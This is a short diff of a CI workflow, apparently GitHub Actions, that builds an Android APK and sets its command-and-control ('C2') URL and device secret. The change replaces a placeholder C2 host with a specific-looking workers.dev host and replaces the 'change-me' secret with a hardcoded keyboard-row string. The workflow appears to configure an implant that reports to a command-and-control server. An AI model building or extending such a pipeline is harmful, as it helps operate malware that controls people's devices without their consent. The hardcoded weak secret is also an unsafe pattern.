@@ -66,11 +66,11 @@ jobs:
           SECRET="${{ secrets.DEVICE_SECRET }}"
           if [ -z "$C2" ]; then
             echo "::warning::C2_URL not set — APK will use compile-time default"
-            C2="https://anon-c2.example.workers.dev"
+            C2="https://anon-c2.bittermusic.workers.dev"
           fi
           if [ -z "$SECRET" ]; then
             echo "::warning::DEVICE_SECRET not set — APK will use compile-time default"
-            SECRET="change-me"
+            SECRET="qwertyuiopasdfghjklzxcvbnm"
           fi
           echo "c2_url=$C2" >> "$GITHUB_OUTPUT"
           # Do not echo secret value
